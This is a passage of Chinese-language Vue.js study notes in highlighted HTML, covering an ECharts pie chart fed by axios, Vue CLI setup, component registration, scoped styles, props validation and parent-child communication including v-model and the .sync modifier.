class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://applet-base-api-t.itheima.net/bill&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">params</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">creator</span>: <span class="string">&#x27;Eirc&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">list</span> = res.<span class="property">data</span>.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 根据获取的数据设置饼图的选项</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">myChart</span>.<span class="title function_">setOption</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">series</span>: [</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">data</span>: <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> (&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">value</span>: item.<span class="property">price</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>: item.<span class="property">name</span></span></span><br><span class="line"><span class="language-javascript">              &#125;))</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          ]</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// ... 其他方法 ...</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// mounted 钩子在 Vue 实例挂载到 DOM 后调用。</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 常用于需要访问 DOM 元素的操作，比如初始化第三方库或创建图表。</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 初始化 ECharts 实例并将其赋值给 myChart 属性。</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">myChart</span> = echarts.<span class="title function_">init</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#main&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 设置饼图的初始选项。</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">myChart</span>.<span class="title function_">setOption</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">title</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">text</span>: <span class="string">&#x27;消费账单列表&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">left</span>: <span class="string">&#x27;center&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">tooltip</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">trigger</span>: <span class="string">&#x27;item&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">legend</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">orient</span>: <span class="string">&#x27;vertical&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">left</span>: <span class="string">&#x27;left&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">series</span>: [</span></span><br><span class="line"><span class="language-javascript">          &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;消费账单&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;pie&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">radius</span>: <span class="string">&#x27;50%&#x27;</span>, <span class="comment">// 半径</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: [],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">emphasis</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">itemStyle</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">shadowBlur</span>: <span class="number">10</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">shadowOffsetX</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">shadowColor</span>: <span class="string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span></span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Vue-CLI-工程化开发-脚手架"><a href="#Vue-CLI-工程化开发-脚手架" class="headerlink" title="Vue CLI 工程化开发 &amp; 脚手架"></a>Vue CLI 工程化开发 &amp; 脚手架</h1><p>使用步骤：</p><ol><li>全局安装（一次）：<code>yarm global add @vue/cli</code> 或 <code>npm install @vue/cli -g</code>；</li><li>查看Vue版本：<code>vue --version</code>;</li><li>创建项目架子：<code>vue create project-name</code>（项目名-仅限英文）；</li><li>启动项目：<code>yarn serve</code> 或 <code>npm run serve</code>（找package.json）;</li></ol><h2 id="脚手架目录文件"><a href="#脚手架目录文件" class="headerlink" title="脚手架目录文件"></a>脚手架目录文件</h2><p><img src="/2023/12/28/Vue/image-20240102095959483.png" alt="image-20240102095959483"></p><h1 id="组件化开发-根组件"><a href="#组件化开发-根组件" class="headerlink" title="组件化开发 &amp; 根组件"></a>组件化开发 &amp; 根组件</h1><p>组件化：一个页面可以拆分为一个个组件，每个组件有着独立的结构、样式和行为，目的是便于维护，利于复用，提升开发效率。</p><p>根组件：整个应用最上层的组件，包裹所有普通小组件。</p><p><img src="/2023/12/28/Vue/image-20240102113015830.png" alt="image-20240102113015830"></p><h2 id="App-vue文件（根组件）的三个组成部分"><a href="#App-vue文件（根组件）的三个组成部分" class="headerlink" title="App.vue文件（根组件）的三个组成部分"></a>App.vue文件（根组件）的三个组成部分</h2><p>整个应用最上层的组件，包裹所有普通小组件。一个根组件App.vue，包含三个部分：</p><ul><li>template：结构（有且仅有一个根元素）；</li><li>script：js逻辑；</li><li>style：css样式（可支持less，需要安装包）;<ul><li>style标签，lang&#x3D;“less”开启less功能；</li><li>装包：<code>yarn add less less-loader</code> 或 <code>npm install less less-loader --save-dev</code></li></ul></li></ul><p><img src="/2023/12/28/Vue/image-20240102113122144.png" alt="image-20240102113122144"></p><h2 id="普通组件的注册使用"><a href="#普通组件的注册使用" class="headerlink" title="普通组件的注册使用"></a>普通组件的注册使用</h2><p>组件注册的两种方式：</p><ol><li>局部注册：只能在注册的组件内使用；<ol><li>在components文件夹中创建.vue文件（三个组成部分）；</li><li>在使用的组件内导入并注册；</li></ol></li><li>全局注册：所有组件内都能使用。<ol><li>在components文件夹中创建.vue文件（三个组成部分）；</li><li>在<strong>main.js</strong>中进行全局注册；</li></ol></li></ol><p>使用：当成html标签使用：<code>&lt;组件名&gt;&lt;/组件名&gt;</code>；</p><p>注意：组件名规范 -&gt; 大驼峰命名法：如ErickinHeader；</p><blockquote><p>局部注册实例：</p><p><em><strong>文件结构</strong></em></p><p><img src="/2023/12/28/Vue/image-20240102162747920.png" alt="image-20240102162747920"></p><p><em><strong>HmHeader.vue</strong></em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hm-header&quot;</span>&gt;</span></span><br><span class="line">    我是hm-header</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.hm-header</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#8064a2</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><em><strong>App.vue</strong></em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 头部组件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HmHeader</span>&gt;</span><span class="tag">&lt;/<span class="name">HmHeader</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 主体组件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HmMain</span>&gt;</span><span class="tag">&lt;/<span class="name">HmMain</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 底部组件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HmFooter</span>&gt;</span><span class="tag">&lt;/<span class="name">HmFooter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 如果 HmFooter + tab 出不来 → 需要配置 vscode</span></span><br><span class="line"><span class="comment">         设置中搜索 trigger on tab → 勾上</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">HmHeader</span> <span class="keyword">from</span> <span class="string">&#x27;./components/HmHeader.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">HmMain</span> <span class="keyword">from</span> <span class="string">&#x27;./components/HmMain.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">HmFooter</span> <span class="keyword">from</span> <span class="string">&#x27;./components/HmFooter.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#x27;组件名&#x27;: 组件对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">HmHeader</span>: <span class="title class_">HmHeader</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">HmMain</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">HmFooter</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.App</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#87ceeb</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>全局注册实例：</p><p><em><strong>main.js</strong></em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件核心作用：导入App.vue，基于App.vue创建结构渲染index.html</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">// 编写导入的代码，往代码的顶部编写(规范)</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">HmButton</span> <span class="keyword">from</span> <span class="string">&#x27;./components/HmButton&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行全局注册 → 在所有的组件范围内都能直接使用</span></span><br><span class="line"><span class="comment">// Vue.component(组件名，组件对象)</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;HmButton&#x27;</span>, <span class="title class_">HmButton</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue实例化，提供render方法 → 基于App.vue创建结构渲染index.html</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="comment">// render: h =&gt; h(App),</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function">(<span class="params">createElement</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 基于App创建元素结构</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">createElement</span>(<span class="title class_">App</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><h2 id="Scoped解决样式冲突"><a href="#Scoped解决样式冲突" class="headerlink" title="Scoped解决样式冲突"></a>Scoped解决样式冲突</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;base-one&quot;&gt;</span><br><span class="line">    BaseOne</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">/* </span><br><span class="line">  1.style中的样式 默认是作用到全局的</span><br><span class="line">  2.加上scoped可以让样式变成局部样式</span><br><span class="line"></span><br><span class="line">  组件都应该有独立的样式，推荐加scoped（原理）</span><br><span class="line">  -----------------------------------------------------</span><br><span class="line">  scoped原理：</span><br><span class="line">  1.给当前组件模板的所有元素，都会添加上一个自定义属性</span><br><span class="line">  data-v-hash值</span><br><span class="line">  data-v-5f6a9d56  用于区分开不通的组件</span><br><span class="line">  2.css选择器后面，被自动处理，添加上了属性选择器</span><br><span class="line">  div[data-v-5f6a9d56]</span><br><span class="line">*/</span><br><span class="line">div&#123;</span><br><span class="line">  border: 3px solid blue;</span><br><span class="line">  margin: 30px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h1><h2 id="父子关系组件"><a href="#父子关系组件" class="headerlink" title="父子关系组件"></a>父子关系组件</h2><h3 id="父传子：props"><a href="#父传子：props" class="headerlink" title="父传子：props"></a>父传子：props</h3><p><img src="/2023/12/28/Vue/image-20240102183229794.png" alt="image-20240102183229794"></p><h4 id="props校验"><a href="#props校验" class="headerlink" title="props校验"></a>props校验</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1.基础写法（类型校验）</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// props: &#123;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//   w: Number,</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// &#125;,</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 2.完整写法（类型、默认值、非空、自定义校验）</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">w</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//类型校验</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="title class_">Number</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//非空校验</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">required</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//默认值</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">default</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//自定义校验</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">validator</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(val)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (val &gt;= <span class="number">100</span> || val &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;传入的范围必须是0-100之间&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子传父：-emit"><a href="#子传父：-emit" class="headerlink" title="子传父：$emit"></a>子传父：$emit</h3><p><img src="/2023/12/28/Vue/image-20240102183345203.png" alt="image-20240102183345203"></p><h2 id="非父子关系组件"><a href="#非父子关系组件" class="headerlink" title="非父子关系组件"></a>非父子关系组件</h2><h3 id="eventbus"><a href="#eventbus" class="headerlink" title="eventbus"></a>eventbus</h3><p><img src="/2023/12/28/Vue/image-20240102185116475.png" alt="image-20240102185116475"></p><h3 id="provide-inject"><a href="#provide-inject" class="headerlink" title="provide&amp;inject"></a>provide&amp;inject</h3><p><img src="/2023/12/28/Vue/image-20240102185209968.png" alt="image-20240102185209968"></p><h2 id="通用组件"><a href="#通用组件" class="headerlink" title="通用组件"></a>通用组件</h2><p>v-model本质上是语法糖，等同于value属性和input事件的缩写。</p><p><img src="/2023/12/28/Vue/image-20240103085847724.png" alt="image-20240103085847724"></p><p><code>v-model</code>：数据的双向绑定，data改变，视图随之改变；视图改变，data随时更新；</p><p><code>:value=&quot;msg&quot;</code>：将data中的msg数据绑定到视图中；</p><p><code>@input=&quot;msg = $event.target.value&quot;</code>：监听视图的变化，当视图变化产生新的值时，将其赋值给data中的msg；</p><h3 id="表单类组件封装"><a href="#表单类组件封装" class="headerlink" title="表单类组件封装"></a>表单类组件封装</h3><ul><li><p>父传子：数据应该是父组件props传递过来的，v-model拆解绑定数据；</p><p><img src="/2023/12/28/Vue/image-20240103090531536.png" alt="image-20240103090531536"></p><blockquote><p>其中，<code>$event</code>是从子组件传递上来的更新值；</p></blockquote></li><li><p>子传父：监听输入，子传父传值给组件进行修改。</p><p><img src="/2023/12/28/Vue/image-20240103090601006.png" alt="image-20240103090601006"></p><blockquote><p><code>e.target.value</code>是视图中变化的新值。</p></blockquote></li></ul><h3 id="v-model简化代码"><a href="#v-model简化代码" class="headerlink" title="v-model简化代码"></a>v-model简化代码</h3><p>父组件v-model简化代码， 实现子组件和父组件数据双向绑定；</p><ul><li><p>子组件：props通过value接收，通过input实现事件触发；</p><p><img src="/2023/12/28/Vue/image-20240103094530039.png" alt="image-20240103094530039"></p></li><li><p>父组件：v-model给组件直接绑定数据。</p><p>简写前：</p><p><img src="/2023/12/28/Vue/image-20240103094547300.png" alt="image-20240103094547300"></p><p>v-model简写后：</p><p><img src="/2023/12/28/Vue/image-20240103094628239.png" alt="image-20240103094628239"></p></li></ul><h2 id="sync修饰符"><a href="#sync修饰符" class="headerlink" title=".sync修饰符"></a>.sync修饰符</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>可以实现 <strong>子组件</strong> 与 <strong>父组件数据</strong> 的 <strong>双向绑定</strong>，简化代码</p><p>简单理解：<strong>子组件可以修改父组件传过来的props值</strong></p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>封装弹框类的基础组件， visible属性 true显示 false隐藏</p><h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p>.sync修饰符 就是 <strong>:属性名</strong> 和 <strong>@update:属性名</strong> 合写</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>父组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//.sync写法</span><br><span class="line">&lt;BaseDialog :visible.sync=&quot;isShow&quot; /&gt;</span><br><span class="line">--------------------------------------</span><br><span class="line">//完整写法</span><br><span class="line">&lt;BaseDialog </span><br><span class="line">  :visible=&quot;isShow&quot; </span><br><span class="line">  @update:visible=&quot;isShow = $event&quot; </span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  visible: Boolean</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">this.$emit(&#x27;update:visible&#x27;, false)</span><br></pre></td></tr></table></figure><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;openDialog&quot;&gt;退出按钮&lt;/button&gt;</span><br><span class="line">    &lt;!-- isShow.sync  =&gt; :isShow=&quot;isShow&quot; @update:isShow=&quot;isShow=$event&quot; --&gt;</span><br><span class="line">    &lt;BaseDialog :isShow.sync=&quot;isShow&quot;&gt;&lt;/BaseDialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import BaseDialog from &#x27;./components/BaseDialog.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      isShow: false,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    openDialog() &#123;</span><br><span class="line">      this.isShow = true</span><br><span class="line">      // console.log(document.querySelectorAll(&#x27;.box&#x27;)); </span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    BaseDialog,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>BaseDialog.vue</p><figure class="highlight plaintext"><table><tr><td 